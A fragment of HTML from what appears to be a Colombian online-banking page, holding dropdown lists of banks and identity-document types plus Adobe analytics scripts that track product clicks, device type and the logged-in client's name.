data-label="BANCOOMEVA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_31">BANCOOMEVA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="COLTEFINANCIERA S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_32">COLTEFINANCIERA S.A.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="CONFIAR COOPERATIVA FINANCIERA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_33">CONFIAR COOPERATIVA FINANCIERA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="COOFIANTIOQUIA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_34">COOFIANTIOQUIA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="COOFINEP COOPERATIVA FINANCIERA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_35">COOFINEP COOPERATIVA FINANCIERA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="COTRAFA COOPERATIVA FINANCIERA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_36">COTRAFA COOPERATIVA FINANCIERA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="DING TECNIPAGOS S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_37">DING TECNIPAGOS S.A.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="FINANCIERA JURISCOOP" tabindex="-1" role="option" id="conoritaThemeform:selectBank_38">FINANCIERA JURISCOOP</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="GIROS Y FINANZAS CF" tabindex="-1" role="option" id="conoritaThemeform:selectBank_39">GIROS Y FINANZAS CF</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="IRIS" tabindex="-1" role="option" id="conoritaThemeform:selectBank_40">IRIS</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="LULO BANK S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_41">LULO BANK S.A.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="MOVii" tabindex="-1" role="option" id="conoritaThemeform:selectBank_42">MOVii</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="SCOTIABANK COLPATRIA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_43">SCOTIABANK COLPATRIA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="SERVIFINANSA S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_44">SERVIFINANSA S.A.</li></ul></div></div><div id="conoritaThemeform:selectDocumentType_panel" class="ui-selectonemenu-panel ui-widget ui-widget-content ui-corner-all ui-helper-hidden ui-shadow ui-input-overlay select-panel__coronitaV2"><div class="ui-selectonemenu-items-wrapper" style="max-height:200px"><ul id="conoritaThemeform:selectDocumentType_items" class="ui-selectonemenu-items ui-selectonemenu-list ui-widget-content ui-widget ui-corner-all ui-helper-reset" role="listbox" aria-activedescendant="conoritaThemeform:selectDocumentType_0"><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all ui-state-highlight" data-label="&amp;nbsp;" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_0">&nbsp;</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cedula de Ciudadania" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_1">Cedula de Ciudadania</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cedula de Extranjeria" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_2">Cedula de Extranjeria</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Tarjeta de Identidad" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_3">Tarjeta de Identidad</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Pasaporte" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_4">Pasaporte</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="No de Identificación Personal" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_5">No de Identificación Personal</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="NIT" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentType_6">NIT</li></ul></div></div><div id="conoritaThemeform:selectDocumentTypeOption_panel" class="ui-selectonemenu-panel ui-widget ui-widget-content ui-corner-all ui-helper-hidden ui-shadow ui-input-overlay select-panel__coronitaV2"><div class="ui-selectonemenu-items-wrapper" style="max-height:200px"><ul id="conoritaThemeform:selectDocumentTypeOption_items" class="ui-selectonemenu-items ui-selectonemenu-list ui-widget-content ui-widget ui-corner-all ui-helper-reset" role="listbox" aria-activedescendant="conoritaThemeform:selectDocumentTypeOption_0"><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all ui-state-highlight" data-label="&amp;nbsp;" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_0">&nbsp;</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cedula de ciudadania" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_1">Cedula de ciudadania</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cedula de extranjeria" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_2">Cedula de extranjeria</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="NIT" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_3">NIT</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Tarjeta de identidad" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_4">Tarjeta de identidad</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Pasaporte" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_5">Pasaporte</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="NUIP" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_6">NUIP</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Carnet diplomatico" tabindex="-1" role="option" id="conoritaThemeform:selectDocumentTypeOption_7">Carnet diplomatico</li></ul></div></div><script>_satellite["_runScript4"](function(event, target, Promise) {
if(adobe.target){if("https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/globalPosition?execution=e1s1"==document.URL){var TargetUserName=document.querySelector("#nameClient > span:nth-child(1)").innerText.trim().split(" ").slice(0,-1).join(" ");window.adobe.target.trackEvent({mbox:"target-global-mbox",params:{"profile.EsCliente":TargetUserName}})}(/windows phone/i.test(navigator.userAgent)||/android/i.test(navigator.userAgent)||/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream)&&(/windows phone/i.test(navigator.userAgent)?window.adobe.target.trackEvent({mbox:"target-global-mbox",params:{"profile.isWindows":!0}}):/android/i.test(navigator.userAgent)?window.adobe.target.trackEvent({mbox:"target-global-mbox",params:{"profile.isAndroid":!0}}):/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream?window.adobe.target.trackEvent({mbox:"target-global-mbox",params:{"profile.isIOS":!0}}):window.adobe.target.trackEvent({mbox:"target-global-mbox",params:{"profile.isUnknown":!0}}))}
});</script><script>_satellite["_runScript5"](function(event, target, Promise) {
try{jQuery(document).on("click","[data-analytics|='cta']",(function(){try{var t=!1;switch(void 0===jQuery(this).attr("data-analytics-name")&&_satellite.logger.info("**** es necesario el atributo data-analytics-name para medir correctamente los CTA ****"),jQuery(this).attr("href")){case"/personas/productos/tarjetas/credito.html":case"/personas/productos/prestamos/personales/libre-disponibilidad.html":case"/personas/productos/tarjetas/credito/pedir-tarjeta-de-credito.html":digitalData.application.fulfillmentModel="online",digitalData.application.application.name="tarjeta credito",digitalData.application.application.type="contratacion",digitalData.application.step=jQuery(this).attr("data-analytics-name"),digitalData.products={attributes:[{primaryCategory:"tarjetas",productSubtype:"tarjeta credito",interestRate:{}}]},t=!0}t&&digitalLink("App On Click Start",digitalData)}catch(t){_satellite.logger.info("error CTA Rule "+t)}}))}catch(t){_satellite.logger.info("error CTA Rule "+t)}
});</script><script>_satellite["_runScript6"](function(event, target, Promise) {
"undefined"!=reSend&&""!=reSend&&(_satellite.logger.info("resend:  envio de: "+reSend),reSend.split(",").forEach((function(e){digitalView(e,digitalData)})));
});</script></body></html>